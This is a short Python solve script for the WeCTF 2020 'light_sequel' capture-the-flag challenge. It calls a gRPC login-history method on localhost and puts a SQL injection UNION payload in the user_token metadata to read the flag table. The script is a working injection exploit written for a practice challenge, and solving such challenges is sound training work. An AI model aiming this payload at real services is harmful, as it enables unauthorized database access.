# Writeup: https://blog.justins.in/wectf-2020/#lightsequel
# chall : https://github.com/wectf/2020/tree/master/light_sequel

import grpc
import main_pb2
import main_pb2_grpc

CON_STR = 'localhost:1004'

with grpc.insecure_channel(CON_STR) as channel:
    stub = main_pb2_grpc.SrvStub(channel)
    res = stub.GetLoginHistory(main_pb2.SrvRequest(), metadata=(('user_token', "')) UNION SELECT flag FROM flags-- "),))
    print(res.ip)
